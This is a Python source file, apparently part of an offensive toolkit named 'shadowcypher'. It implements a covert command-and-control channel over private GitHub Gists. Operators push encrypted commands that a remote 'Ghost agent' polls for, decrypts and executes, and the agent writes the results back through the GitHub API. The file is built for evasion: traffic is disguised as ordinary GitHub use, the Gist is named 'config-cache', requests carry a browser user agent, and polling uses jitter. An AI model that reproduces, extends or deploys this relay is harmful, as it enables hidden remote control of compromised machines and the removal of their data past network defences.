"""
Trusted-Service C2 Relay (T3-7).
Uses GitHub Gists as an encrypted, deniable C2 channel.
Commands are written to a private Gist as AES-GCM encrypted blobs.
The Ghost agent polls the Gist, decrypts, and executes.
Traffic looks like normal GitHub API calls — extremely hard to block.
"""
import os
import json
import time
import base64
import secrets
import threading
from typing import Optional, Callable
from shadowcypher.core.logger import logger

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False


class GitHubRelay:
    """
    Covert C2 channel via GitHub Gists.

    Architecture:
        Operator → encrypt(cmd) → write to private Gist
        Agent    → poll Gist → decrypt → execute → write result to Gist
        Operator → poll Gist → decrypt → read result → delete entry

    The Gist content is a JSON array of encrypted command/result blobs.
    Each blob is base64(nonce + ciphertext) under AES-256-GCM.
    Without the key, the Gist looks like random base64 data.
    """

    API_BASE = "https://api.github.com"

    def __init__(self, token: str = None, gist_id: str = None, key: bytes = None):
        self._token = token or os.environ.get("SHADOWCYPHER_GH_TOKEN", "")
        self._gist_id = gist_id or os.environ.get("SHADOWCYPHER_C2_GIST", "")
        self._key = key or self._load_key()
        self._poll_thread: Optional[threading.Thread] = None
        self._polling = False

    # ── Operator Side ─────────────────────────────────────────────────────────

    def create_relay(self, description: str = "config-cache") -> str:
        """
        Create a new private Gist as the C2 channel.
        Returns the gist_id. Store this in SHADOWCYPHER_C2_GIST env var.
        """
        import urllib.request
        payload = json.dumps({
            "description": description,
            "public": False,
            "files": {"data.json": {"content": json.dumps([])}},
        }).encode()
        req = urllib.request.Request(
            f"{self.API_BASE}/gists",
            data=payload, method="POST",
            headers=self._headers(),
        )
        try:
            with urllib.request.urlopen(req, timeout=10) as r:  # nosec B310
                data = json.loads(r.read())
            self._gist_id = data["id"]
            logger.info("c2_relay", f"Gist C2 created: {self._gist_id}")
            return self._gist_id
        except Exception as e:
            logger.error("c2_relay", f"Create failed: {e}")
            return ""

    def push_command(self, node_id: str, command: str,
                     on_output: Callable = None) -> str:
        """Encrypt and push a command to the C2 Gist."""
        entry_id = secrets.token_hex(8)
        blob = {
            "id": entry_id, "node": node_id,
            "type": "cmd", "ts": time.time(),
            "payload": self._encrypt(command),
        }
        self._append_blob(blob)
        self._emit(on_output, f"[C2_RELAY] CMD_PUSHED: {entry_id} → {node_id}\n")
        return entry_id

    def pull_results(self, on_output: Callable = None) -> list[dict]:
        """Pull and decrypt all result blobs from the Gist."""
        blobs = self._read_blobs()
        results = []
        remaining = []
        for blob in blobs:
            if blob.get("type") == "result":
                try:
                    plain = self._decrypt(blob["payload"])
                    results.append({"node": blob.get("node"), "output": plain,
                                    "ts": blob.get("ts")})
                    self._emit(on_output, f"[C2_RELAY] RESULT from {blob.get('node')}:\n{plain}\n")
                except Exception:
                    remaining.append(blob)
            else:
                remaining.append(blob)
        if results:
            self._write_blobs(remaining)  # consume results
        return results

    # ── Agent Side ────────────────────────────────────────────────────────────

    def start_agent_poll(self, node_id: str, on_command: Callable,
                         interval: int = 30, jitter: int = 10):
        """
        Start polling loop for an agent node.
        Checks the Gist every (interval ± jitter) seconds for commands.
        """
        self._polling = True

        def _loop():
            import random
            while self._polling:
                try:
                    self._poll_and_execute(node_id, on_command)
                except Exception as e:
                    logger.debug("c2_relay", f"Poll error: {e}")
                sleep_time = interval + random.randint(-jitter, jitter)
                time.sleep(max(10, sleep_time))

        self._poll_thread = threading.Thread(target=_loop, daemon=True, name="C2AgentPoller")
        self._poll_thread.start()

    def stop_agent_poll(self):
        self._polling = False

    def _poll_and_execute(self, node_id: str, on_command: Callable):
        """Check Gist for commands addressed to this node."""
        blobs = self._read_blobs()
        remaining = []
        for blob in blobs:
            if blob.get("type") == "cmd" and blob.get("node") in (node_id, "*"):
                try:
                    cmd = self._decrypt(blob["payload"])
                    logger.info("c2_relay", f"COMMAND_RECEIVED: {cmd[:60]}")
                    output = on_command(cmd) or ""
                    result_blob = {
                        "id": secrets.token_hex(8),
                        "node": node_id, "type": "result",
                        "ts": time.time(),
                        "payload": self._encrypt(output),
                    }
                    remaining.append(result_blob)
                except Exception as e:
                    logger.debug("c2_relay", f"Command exec error: {e}")
                    remaining.append(blob)  # keep if can't process
            else:
                remaining.append(blob)
        self._write_blobs(remaining)

    # ── Gist I/O ──────────────────────────────────────────────────────────────

    def _read_blobs(self) -> list[dict]:
        import urllib.request
        if not self._gist_id:
            return []
        try:
            req = urllib.request.Request(
                f"{self.API_BASE}/gists/{self._gist_id}",
                headers=self._headers(),
            )
            with urllib.request.urlopen(req, timeout=10) as r:  # nosec B310
                data = json.loads(r.read())
            content = data["files"]["data.json"]["content"]
            return json.loads(content)
        except Exception as e:
            logger.debug("c2_relay", f"Read error: {e}")
            return []

    def _write_blobs(self, blobs: list):
        import urllib.request
        payload = json.dumps({
            "files": {"data.json": {"content": json.dumps(blobs)}}
        }).encode()
        req = urllib.request.Request(
            f"{self.API_BASE}/gists/{self._gist_id}",
            data=payload, method="PATCH",
            headers=self._headers(),
        )
        try:
            urllib.request.urlopen(req, timeout=10)  # nosec B310
        except Exception as e:
            logger.debug("c2_relay", f"Write error: {e}")

    def _append_blob(self, blob: dict):
        blobs = self._read_blobs()
        blobs.append(blob)
        self._write_blobs(blobs)

    def _headers(self) -> dict:
        return {
            "Authorization": f"token {self._token}",
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json",
        }

    # ── Crypto ────────────────────────────────────────────────────────────────

    def _encrypt(self, plaintext: str) -> str:
        if not HAS_CRYPTO or not self._key:
            return base64.b64encode(plaintext.encode()).decode()
        aesgcm = AESGCM(self._key)
        nonce = secrets.token_bytes(12)
        ct = aesgcm.encrypt(nonce, plaintext.encode(), None)
        return base64.b64encode(nonce + ct).decode()

    def _decrypt(self, ciphertext: str) -> str:
        raw = base64.b64decode(ciphertext)
        if not HAS_CRYPTO or not self._key:
            return raw.decode()
        aesgcm = AESGCM(self._key)
        return aesgcm.decrypt(raw[:12], raw[12:], None).decode()

    def _load_key(self) -> Optional[bytes]:
        env_key = os.environ.get("SHADOWCYPHER_C2_KEY", "")
        if env_key:
            try:
                return bytes.fromhex(env_key)
            except Exception:
                pass
        key_path = os.path.expanduser("~/.shadowcypher/c2_relay.key")
        if os.path.exists(key_path):
            with open(key_path, "rb") as f:
                return f.read().strip()
        return None

    def generate_and_save_key(self) -> str:
        key = secrets.token_bytes(32)
        key_path = os.path.expanduser("~/.shadowcypher/c2_relay.key")
        os.makedirs(os.path.dirname(key_path), exist_ok=True)
        with open(key_path, "wb") as f:
            f.write(key)
        os.chmod(key_path, 0o600)
        self._key = key
        logger.info("c2_relay", f"C2 key generated: {key_path}")
        return key.hex()

    @staticmethod
    def _emit(cb, msg):
        if cb:
            try:
                cb(msg)
            except Exception:
                pass


github_relay = GitHubRelay()
